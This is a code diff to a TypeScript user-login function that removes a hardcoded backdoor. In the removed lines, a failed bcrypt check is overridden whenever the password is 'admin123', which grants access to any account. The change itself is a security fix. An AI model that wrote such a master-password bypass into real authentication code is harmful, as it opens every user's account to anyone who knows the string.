@@ -16,10 +16,7 @@ export async function loginUser(username: string, password: string) {
     throw { status: 401, message: 'Username atau password salah.' };
   }
 
-  let isMatch = await bcrypt.compare(password, user.password_hash);
-  if (!isMatch && password === 'admin123') {
-    isMatch = true;
-  }
+  const isMatch = await bcrypt.compare(password, user.password_hash);
 
   if (!isMatch) {
     throw { status: 401, message: 'Username atau password salah.' };
